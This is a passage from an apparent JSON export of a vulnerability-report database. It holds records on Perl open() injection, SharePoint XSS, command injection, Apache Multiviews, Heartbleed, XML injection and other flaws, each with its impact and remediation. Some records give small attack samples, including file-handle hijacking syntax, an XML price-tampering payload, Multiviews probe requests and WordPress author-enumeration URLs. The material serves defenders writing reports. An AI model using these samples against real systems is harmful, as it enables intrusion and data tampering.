if a pipe (|) character is adding to the beginning or end of the file name. When Perl sees the pipe character it will execute a command rather than open the file, which could lead to a malicious attacker spawning a shell and gain control.\nAlso the \"open\" function can be abused to gain access to other file handlers that have already been opened by the application, which can go beyond files and include sockets, STDIN, STDOUT, and STDERR. By using the <&=N syntax where N is the file descriptor number the \"open\" function will return the file handle that corresponds to N. Note STDIN, STDOUT, and STDERR are always set to be 0, 1, and 2. A malicious user may be able to corrupt or read information from a file handle that is already in use. The following are examples of how the  \"open\" function can be used to hijack file handle streams:\nGeneral stream duplication:\n<pre><code class=\"perl\">open($fh, \"<&=5\"); </pre>\nStream duplication shortcut for STDOUT:\n<pre><code class=\"perl\">open($fh, \">-\"); </pre>\nStream duplication shortcut for STDIN:\n<pre><code class=\"perl\">open($fh. \"<-\"); </pre>\n","poc":null,"impact":"\n","remediation":"Ensure that all \"open\" function commands are called with three arguments, including the file handler, file path, and file permissions. This will allow the filename passed into the \"open\" function to be treated literally, forcing any special characters entered to be treated as a part of the file name. Below are two examples of proper ways to use the \"open\" function:\nTechnique 1:\n<pre><code class=\"perl\">open( $fh, '<', \"filename\"); </pre>\nTechnique 2:\n<pre><code class=\"perl\">use IO::File; my $fh = IO::File->new( 'output.txt', q{>} ); </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":547,"plugin_id":null,"title":"Microsoft SharePoint Server &#039;_layouts/help.aspx&#039; Cross Site Scripting Vulnerability","type":null,"description":"Microsoft SharePoint Server 2007 and SharePoint Services 3.0 are prone to a cross-site scripting vulnerability because they fail to properly sanitize user-supplied input.\nAn attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.\n","poc":null,"impact":"An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.\n","remediation":"The vendor has released an advisory and updates. Please see the references for details.\nMicrosoft SharePoint Server 2007 SP2\nMicrosoft Security Update for Microsoft Office SharePoint Server 3.0 (KB979445), 32-bit Edition\nhttp://www.microsoft.com/downloads/details.aspx?familyid=52a55423-f33b -4cd1-919d-806972a553df\nMicrosoft SharePoint Services 3.0 SP1\nMicrosoft Security Update for Microsoft Windows SharePoint Services 3.0 (KB983444), 32-bit Edition\nhttp://www.microsoft.com/downloads/details.aspx?familyid=3841ceda-d0af -4e5e-8a1a-7dd954850783\nMicrosoft SharePoint Services 3.0 SP2\nMicrosoft Security Update for Microsoft Windows SharePoint Services 3.0 (KB983444), 32-bit Edition\nhttp://www.microsoft.com/downloads/details.aspx?familyid=3841ceda-d0af -4e5e-8a1a-7dd954850783\nMicrosoft SharePoint Services 64-bit 3.0 SP2\nMicrosoft Security Update for Microsoft Windows SharePoint Services 3.0 (KB983444), 64-bit Edition\nhttp://www.microsoft.com/downloads/details.aspx?familyid=94bc76d4-78e4 -4bda-8922-36c3a9d3854f\nMicrosoft SharePoint Server 2007 SP1\nMicrosoft Security Update for Microsoft Office SharePoint Server 3.0 (KB979445), 32-bit Edition\nhttp://www.microsoft.com/downloads/details.aspx?familyid=52a55423-f33b -4cd1-919d-806972a553df\nMicrosoft SharePoint Server 2007 x64 SP1\nMicrosoft Security Update for Microsoft Office SharePoint Server 2007 (KB979445), 64-bit Edition\nhttp://www.microsoft.com/downloads/details.aspx?familyid=4d84a25b-532f -4319-9ab2-90e5b82ebd90\nMicrosoft SharePoint Server 2007 x64 SP2\nMicrosoft Security Update for Microsoft Office SharePoint Server 2007 (KB979445), 64-bit Edition\nhttp://www.microsoft.com/downloads/details.aspx?familyid=4d84a25b-532f -4319-9ab2-90e5b82ebd90\nMicrosoft SharePoint Services 64-bit 3.0 SP1\nMicrosoft Security Update for Microsoft Windows SharePoint Services 3.0 (KB983444), 64-bit Edition\nhttp://www.microsoft.com/downloads/details.aspx?familyid=94bc76d4-78e4 -4bda-8922-36c3a9d3854f\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":548,"plugin_id":null,"title":"Username/Password returned in later response","type":null,"description":"Username/Passwords submitted to the application are returned in clear form in later responses from the application. This behavior increases the risk that users' username/passwords will be captured by an attacker. Many types of vulnerability, such as weaknesses in session handling, broken access controls, and cross-site scripting, would enable an attacker to leverage this behavior to retrieve the passwords of other application users. This possibility typically exacerbates the impact of those other vulnerabilities, and in some situations can enable an attacker to quickly compromise the entire application.\n","poc":null,"impact":"This behavior increases the risk that users' username/passwords will be captured by an attacker. Many types of vulnerability, such as weaknesses in session handling, broken access controls, and cross-site scripting, would enable an attacker to leverage this behavior to retrieve the passwords of other application users. This possibility typically exacerbates the impact of those other vulnerabilities, and in some situations can enable an attacker to quickly compromise the entire application.\n","remediation":"There is usually no good reason for an application to return users' login credential in its responses. This behavior should be removed from the application.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":549,"plugin_id":null,"title":"Improper Sanitization of Special Elements used in an OS Command (&#039;OS Command Injection&#039;)","type":null,"description":"An OS command injection attack occurs when an attacker attempts to execute system level commands through a vulnerable application. Applications are considered vulnerable to the OS command injection attack if they utilize user input in a system level command.\n","poc":null,"impact":"An attacker can leverage OS command injection in an application to elevate privileges, execute arbitrary commands and compromise the underlying operating system.\n","remediation":"To defend system from the weakness developers need to use library calls when possible to create desired functionality without external input. When external input is inescapable, developers need to utilize secure input and output handling.\nAs a temporary solution we strongly recommend blocking access to vulnerable script until the issue is resolved. This can be achieved either using native functionality of the webserver or changing system access permission to file.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":550,"plugin_id":null,"title":"Apache Multiviews Attack","type":null,"description":"Apache has a feature called Multiviews, which is oftentimes turned on by default on certain directories (and sometimes turned on through configuration). Here's what Multiviews should do:\nIf you don't know the extension of a file on the server, you can ask for the file without the extension, and then provide the mime types that you support(e.g. Accept: text/html). Apache will then serve the file with the appropriate extension, for example:\nAssume that you have a index.html file (or index.php), which both return text/html content type, and you request:\n<pre>GET /index HTTP/1.0 Host: localhost Accept: text/html </pre>\nThen Apache will serve the file index.html. If another file was there, which is called index.gif, it wouldn't be served (due to the Accept header we specified).\nThe problem is that if you request a file, and write an invalid mime-type, Apache will present you with all of the options:\n<pre>GET /index HTTP/1.0 Host: localhost Accept: application/whatever; q=1.0 </pre>\nThe response would be:\n<pre>HTTP/1.1 406 Not Acceptable Date: Sat, 14 Jul 2007 10:51:57 GMT Server: Apache/2.0.59 (Win32) PHP/5.2.0 Alternates: {\"index.html\" 1 {type text/html} {length 0}}, {\"index.php\" 1 {type application/x-httpd-php} {length 450}} Vary: negotiate,accept TCN: list Content-Length: 507 Connection: close Content-Type: text/html; charset=iso-8859-1  <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>406 Not Acceptable</title> </head><body> <h1>Not Acceptable</h1> <p>An appropriate representation of the requested resource /index could not be found on this server.</p> Available variants: <ul> <li><a href=\"index.html\">index.html</a> , type text/html</li> <li><a href=\"index.php\">index.php</a> , type application/x-httpd-php</li> </ul> <hr> <address>Apache/2.0.59 (Win32) PHP/5.2.0 Server at localhost Port 80</address> </body></html> </pre>\nThis reveals some files served by the server that might not be meant for browsing.\n","poc":null,"impact":"Ensure that multiview feature is not enabled in your Apache configuration.\n","remediation":"To disable Apache Multiviews and the handling of script files with multiple extensions, you can insert the following configuration in the .htaccess file.\n<pre>Options -MultiViews AddHandler None .php AddHandler None .php5 AddHandler None .php4 AddHandler None .pl AddHandler None .py AddHandler None .py23 AddHandler None .rb AddHandler None .cgi <FilesMatch \\.php$>      SetHandler x-httpd-php5      # For PHP5      ## SetHandler x-httpd-php    # For PHP4 </FilesMatch> <FilesMatch \\.php5$>      SetHandler x-httpd-php5 </FilesMatch> <FilesMatch \\.php4$>      SetHandler x-httpd-php </FilesMatch> <FilesMatch \\.pl$>      SetHandler x-httpd-perl </FilesMatch> <FilesMatch \\.py$>      SetHandler x-httpd-python </FilesMatch> <FilesMatch \\.py23$>      SetHandler x-httpd-python </FilesMatch> <FilesMatch \\.rb$>      SetHandler x-httpd-ruby </FilesMatch> <FilesMatch \\.cgi$>      SetHandler cgi-script </FilesMatch> </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":551,"plugin_id":null,"title":"Apache Multiviews Enabled","type":null,"description":"Apache has a feature called Multiviews, which is oftentimes turned on by default on certain directories (and sometimes turned on through configuration). Here's what Multiviews should do:\nIf you don't know the extension of a file on the server, you can ask for the file without the extension, and then provide the mime types that you support(e.g. Accept: text/html). Apache will then serve the file with the appropriate extension, for example:\nAssume that you have a index.html file (or index.php), which both return text/html content type, and you request:\n<pre>GET /index HTTP/1.0 Host: localhost Accept: text/html </pre>\nThen Apache will serve the file index.html. If another file was there, which is called index.gif, it wouldn't be served (due to the Accept header we specified).\nThe problem is that if you request a file, and write an invalid mime-type, Apache will present you with all of the options:\n<pre>GET /index HTTP/1.0 Host: localhost Accept: application/whatever; q=1.0 </pre>\nThe response would be:\n<pre>HTTP/1.1 406 Not Acceptable Date: Sat, 14 Jul 2007 10:51:57 GMT Server: Apache/2.0.59 (Win32) PHP/5.2.0 Alternates: {\"index.html\" 1 {type text/html} {length 0}}, {\"index.php\" 1 {type application/x-httpd-php} {length 450}} Vary: negotiate,accept TCN: list Content-Length: 507 Connection: close Content-Type: text/html; charset=iso-8859-1  <!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"> <html><head> <title>406 Not Acceptable</title> </head><body> <h1>Not Acceptable</h1> <p>An appropriate representation of the requested resource /index could not be found on this server.</p> Available variants: <ul> <li><a href=\"index.html\">index.html</a> , type text/html</li> <li><a href=\"index.php\">index.php</a> , type application/x-httpd-php</li> </ul> <hr> <address>Apache/2.0.59 (Win32) PHP/5.2.0 Server at localhost Port 80</address> </body></html> </pre>\nThis reveals some files served by the server that might not be meant for browsing.\n","poc":null,"impact":"Ensure that Apache Multiview functionality is disabled in your Apache configuration.\n","remediation":"To disable Apache Multiviews and the handling of script files with multiple extensions, you can insert the following configuration in the .htaccess file.\n<pre>Options -MultiViews AddHandler None .php AddHandler None .php5 AddHandler None .php4 AddHandler None .pl AddHandler None .py AddHandler None .py23 AddHandler None .rb AddHandler None .cgi <FilesMatch \\.php$>      SetHandler x-httpd-php5      # For PHP5      ## SetHandler x-httpd-php    # For PHP4 </FilesMatch> <FilesMatch \\.php5$>      SetHandler x-httpd-php5 </FilesMatch> <FilesMatch \\.php4$>      SetHandler x-httpd-php </FilesMatch> <FilesMatch \\.pl$>      SetHandler x-httpd-perl </FilesMatch> <FilesMatch \\.py$>      SetHandler x-httpd-python </FilesMatch> <FilesMatch \\.py23$>      SetHandler x-httpd-python </FilesMatch> <FilesMatch \\.rb$>      SetHandler x-httpd-ruby </FilesMatch> <FilesMatch \\.cgi$>      SetHandler cgi-script </FilesMatch> </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":552,"plugin_id":null,"title":"Apache mod_proxy Content-Length Overflow","type":null,"description":"The remote web server appears to be running a version of Apache that is older than version 1.3.32. This version is reportedly vulnerable to a heap based buffer overflow in proxy_util.c for mod_proxy.\n","poc":null,"impact":"This issue may lead remote attackers to cause a denial of service and possibly execute arbitrary code on the server.\n","remediation":"Upgrade to Apache 1.3.32 or later.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":553,"plugin_id":null,"title":"Apache HTTP Server httpOnly Cookie Information Disclosure","type":null,"description":"The version of Apache HTTP Server running on the remote host has an information disclosure vulnerability. Sending a request with HTTP headers long enough to exceed the server limit causes the web server to respond with an HTTP 400. By default, the offending HTTP header and value are displayed on the 400 error page. When used in conjunction with other attacks (e.g., cross-site scripting), this could result in the compromise of httpOnly cookies.\n","poc":null,"impact":"When used in conjunction with other attacks (e.g., cross-site scripting), this could result in the compromise of httpOnly cookies.\n","remediation":"Upgrade to Apache version 2.0.65 / 2.2.22 or later.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:11","updated_at":"2018-11-12 09:25:11","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":554,"plugin_id":null,"title":"Apache &lt; 1.3.29 Multiple Modules Local Overflow","type":null,"description":"The remote host appears to be running a version of the Apache web server which is older than 1.3.29. Such versions are reportedly affected by local buffer overflow vulnerabilities in the mod_alias and mod_rewrite modules.\n","poc":null,"impact":"An attacker could exploit these vulnerabilities to execute arbitrary code in the context of the affected application.\n","remediation":"Upgrade to Apache web server version 1.3.29 or later.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":555,"plugin_id":null,"title":"Apache mod_ssl ssl_engine_log.c mod_proxy Hook Function Remote Format String","type":null,"description":"The remote host is using a version vulnerable of mod_ssl which is older than 2.8.19. There is a format string condition in the log functions of the remote module which may allow an attacker to execute arbitrary code on the remote host.\n","poc":null,"impact":"It may allow an attacker to execute arbitrary code on the remote host.\n","remediation":"Upgrade to mod_ssl version 2.8.19 or newer\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":556,"plugin_id":null,"title":"XML Injection","type":null,"description":"The application inserts untrusted user-supplied data into an XML document in such a way that any XML syntax passed as part of the input can modify the XML document's structure. Applications often use XML documents to store data and send messages between application components and other back-end systems. When an application constructs or modifies an XML document by inserting untrusted data in an insecure manner (e.g. concatenation to a string containing an XML document), any XML structure passed via the vulnerable input will be interpreted as XML syntax when the resulting document is later parsed.\nFor example, consider an e-commerce application that takes a user's order, inserts the order data into an XML document, and then makes a web service call to a back-end system using that XML document to submit the order. The following XML document is used as the order template:\n<pre><code class=\"xml\"><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <items> \t<item> \t\t<description>{description}</description> \t\t<price>{price}</price> \t\t<quantity>{quantity}</quantity> \t</item> </items> </pre>\nThe application takes the following data from the user in the order page's quantity field, and inserts it into the XML document above, replacing the \"{quantity}\" substring:\n<pre><code class=\"xml\">1</quantity><price>1.00</price><quantity>1 </pre>\nInserting this data yields the following XML document:\n<pre><code class=\"xml\"><?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <items> \t<item> \t\t<description>Item</description> \t\t<price>49.99</price> \t\t<quantity>1</quantity><price>1.00</price><quantity>1</quantity> \t</item> </items> </pre>\nSAX parsers such as org.xml.sax and javax.xml.parsers.SAXParser will parse the above XML and honor the second price and quantity tags, allowing a user to modify the price of the item server-side.\n","poc":null,"impact":"With the ability to submit raw XML to the application, an attacker can insert malicious tags to affect application behavior in a variety of ways. If XML documents are used to store application data, an attacker may be able to exploit XML injection to insert arbitrary data into the document. If this data is used to execute application functionality, the attacker will gain some level of control over that functionality's behavior. At a minimum, data integrity will be lost since the application has no way of distinguishing between legitimate data and data that has been tampered with. If the application constructs XML documents that are then parsed by the application or another entity (such as a consuming web service), the attacker will be able to control that functionality as well, and any outcome it may produce. Such attacks may focus on bypassing business logic restrictions to perform unauthorized actions (e.g. adding new users, executing unauthorized transactions, etc.).\n","remediation":"The application should encode XML-specific control characters before inserting untrusted input into XML strings. According to the RFC (RFC 3076), the following characters must be replaced with their encoded form in attribute nodes and text nodes:\n--Ampersand (&): &\n--Open Angle Bracket (<): <\n--Close Angle Bracket (>): >\n--Single-quote ('): &apos;\n--Double-quote (\"): \"\n--Whitespace characters #x9, #xA, and #xD: &#x9, &#xA, &#xD\n\n","cvss_base_score":4.3,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":557,"plugin_id":null,"title":"OpenSSL Heartbeat Information Disclosure (Heartbleed)","type":null,"description":"Based on its response to a TLS request with a specially crafted heartbeat message (RFC 6520), the remote service appears to be affected by an out-of-bounds read flaw.\nThis flaw could allow a remote attacker to read the contents of up to 64KB of server memory, potentially exposing passwords, private keys, and other sensitive data.\n","poc":null,"impact":"This flaw could allow a remote attacker to read the contents of up to 64KB of server memory, potentially exposing passwords, private keys, and other sensitive data.\n","remediation":"Upgrade to OpenSSL 1.0.1g or later.\nAlternatively, recompile OpenSSL with the '-DOPENSSL_NO_HEARTBEATS' flag to disable the vulnerable functionality.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":558,"plugin_id":null,"title":"Apache &lt; 1.3.37 mod_rewrite LDAP Protocol URL Handling Overflow","type":null,"description":"The remote host appears to be running a version of Apache which is older than 1.3.37.\n","poc":null,"impact":"This version contains an off-by-one buffer overflow in the mod_rewrite module.\n","remediation":"Upgrade to version 1.3.37 or later.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":559,"plugin_id":null,"title":"Mod_ssl ssl_util_uuencode_binary Remote Overflow","type":null,"description":"The remote host is using a version of mod_ssl which is older than 2.8.18.\n","poc":null,"impact":"This version is vulnerable to a flaw which may allow an attacker to disable the remote\nweb site remotely, or to execute arbitrary code on the remote host.\n","remediation":"Upgrade to version 2.8.18 (Apache 1.3) or to Apache 2.0.50.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":560,"plugin_id":null,"title":"WordPress Username Enumeration","type":null,"description":"By simply adding the string /?author=(number) to the end of the target domain, will result in your username being displayed if not protected. Most sites have no more than 2 registered usernames so botnets typically search up to 10 numbers e.g.\nhttp://mywebsite.co.uk/?author=1\nhttp://mywebsite.co.uk/?author=2\nhttp://mywebsite.co.uk/?author=3\n","poc":null,"impact":"If your site is using pretty permalinks, it will return a 301 redirect with a Location header of http://mysite.url/author/username. If your site isn't using pretty permalinks, it will return a status of 200 (OK) instead, so WPScan will check the feed for the string \"posts by username\" and extract the username.\n","remediation":"Turn off pretty permalinks. This will force WPScan and similar tools to parse the content of your site for usernames rather than relying on the URL.\nForce users to set a different nickname. In the absence of a username in the URL, scanning tools will search for \"posts by username\" in the feed/post content instead. If you aren't putting usernames out there, then they can't be nabbed.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":561,"plugin_id":null,"title":"Insufficient Anti-automation","type":null,"description":"Insufficient Anti-automation occurs when a web application permits an attacker to automate a process that was originally designed to be performed only in a manual fashion, i.e. by a human web user.\n","poc":null,"impact":"Web application functionality that is often a target for automation attacks may include:\n--Application login forms - attackers may automate brute force login requests in an attempt to guess user credentials\n--Service registration forms - attackers may automatically create thousands of new accounts\n--Email forms - attackers may exploit email forms as spam relays or for flooding a certain user's mailbox\n--Account maintenance - attackers may perform mass DoS against an application, by flooding it with numerous requests to disable or delete user accounts\n--Account information forms - attackers may perform mass attempts to harvest user personal information from a web application\n--Comment forms / Content Submission forms - these may be used for spamming blogs, web forums and web bulletin boards by automatically submitting contents such as spam or even web-based malware\n--Forms tied to SQL database queries - these may be exploited in order to perform a denial of service attack against the application. The attack is performed by sending numerous heavy SQL queries in a short period of time, hence denying real users from service.\n--eShopping / eCommerce - eShopping and eCommerce applications that do not enforce human-only buyers, can be exploited in order to buy preferred items in large amounts, such as sporting events tickets. These are later sold by scalpers for higher prices.\n--Online polls - polls and other types of online voting systems can be automatically subverted in favor of a certain choice.\n--Web-based SMS message sending - attackers may exploit SMS message sending systems in order to spam mobile phone users\n\n","remediation":"Use CAPTCHA or any other anti-automation mechanisms to prevent various automated attacks.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":562,"plugin_id":null,"title":"Reflection Attack in an Authentication Protocol","type":null,"description":"Simple authentication protocols are subject to reflection attacks if a malicious user can use the target machine to impersonate a trusted user.\n","poc":null,"impact":"Gain privileges / assume identity.The primary result of reflection attacks is successful authentication with a target machine -- as an impersonated user.\n","remediation":"Use different keys for the initiator and responder or of a different type of challenge for the initiator and responder. Let the initiator prove its identity before proceeding.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":563,"plugin_id":null,"title":"Apache Web Server Server-Info Enabled","type":null,"description":"We found that Apache server-info is enabled. Information disclosed from this page can be used for gaining further information about the target system.\n","poc":null,"impact":"An attacker can gather useful information about the internals of the target web server, including:\n--Server current configuration\n--Server version\n--Server build time\n--Server root\n--Server httpd.conf configuration file path\n--Server build parameters\n--Apache modules and module directives\n\n","remediation":"We recommend that this functionality is disabled, this can be done by commenting out the Location/server-info section from the configuration file.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":564,"plugin_id":null,"title":"Server Path Disclosure Pattern Found","type":null,"description":"The application discloses an internal path on the server, possibly through a GET or POST parameter, client-side source code (including HTML comments), or an error message.\n","poc":null,"impact":"Exposing server paths to the user may allow an attacker to determine the server's file system structure, operating system, or technology stack. An attacker can use this information to research known vulnerabilities and more efficiently target attacks against the affected technologies.\n","remediation":"Remove references to server paths that are revealed on the client side. References revealed through application-level resources, such as HTML comments, source code, or application errors (stack traces), should be removed from client-side code and handled properly on the server side. Server-level references revealing path information, such as default error messages from the web server, should be configured to present custom error pages without revealing path information.\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:N/I:N/A:N/CDP:L/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Medium","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":565,"plugin_id":null,"title":"Unsigned VIEWSTATE Parameter","type":null,"description":"The VIEWSTATE parameter sent to the user in HTTP responses is not signed. The VIEWSTATE is a Base64-encoded field passed back and forth between the application and the browser. It is used by ASP.NET to persist changes to the state of a web form as the user navigates across pages in the application. This vulnerability exists when ASP.NET is configured to not cryptographically sign the VIEWSTATE values.\n","poc":null,"impact":"When the VIEWSTATE parameter is not signed, it allows an attacker to tamper data in order to bypass workflow or business logic controls. If the VIEWSTATE holds data that affects displayed information or influences security checks, an attacker could tamper with the values to bypass controls or to forge attacks against legitimate users. For example, if an eCommerce website relies on an unsigned VIEWSTATE to store prices across requests, an attacker could leverage this to purchase items at a discounted price or to skip steps in the selling process.\n","remediation":"Ensure that VIEWSTATE signing is enabled in the application. By default, .NET version 2.0 (IIS 7.0) and newer turns on signing of VIEWSTATE values. To enable VIEWSTATE signing, set EnableViewStateMac=true in page directives or in the web.config file.\nIn addition, as a general best practice to provide confidentiality for users' data, the VIEWSTATE should be encrypted as well. To enable VIEWSTATE encryption, set ViewStateEncryptionMode=\"Always\" in page directives or in the web.config file and configure the key in each server of the farm. This can be done setting the <machineKey> element's attribute in the machine.config file to AES. Enabling encryption implies key management issues (key rotation, key strength, backups, etc.), which are out of scope for this remediation.\n","cvss_base_score":2.1,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:S/C:N/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:12","updated_at":"2018-11-12 09:25:12","approved":1,"v_likelihood":"Low","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":566,"plugin_id":null,"title":"X.509 Certificate Expired (SSL/TLS)","type":null,"description":"An X.509 certificate is considered to be expired when its expiry date falls before the current date. This problem may occur as a result of poor certificate management practices.\nA certificate's expiry date is included within the certificate itself. If the certificate is not renewed prior to its expiration date, it is said to have expired. For example, if the \"Expires On\" date on a certificate is 01/01/2014 and the current date is 01/02/2014 then the certificate is considered to be expired.\nX.509 certificates enable users to surf the web securely by facilitating encryption of sensitive data as it flows across the Internet. X.509 certificates are important as they let end users know that they are communicating with trusted websites. Certificate Authorities (CAs) such as VeriSign, Comodo, etc. verify a website's identity and issue an X.509 certificate to the website's owner. When a user visits a website the user's browser and the website exchange keys allowing the transmission of encrypted data. The browser also verifies that the X.509 certificate presented by the website is current and alerts the user with a warning message if the certificate is expired.\n","poc":null,"impact":"An expired X.509 certificate may result in loss of sensitive information, which can include an end user's personally identifiable information such as social security number (SSN), driver's license number, and financial information. The loss of sensitive or proprietary information can directly affect end users, as well as the certificate owner from a financial, reputational, or 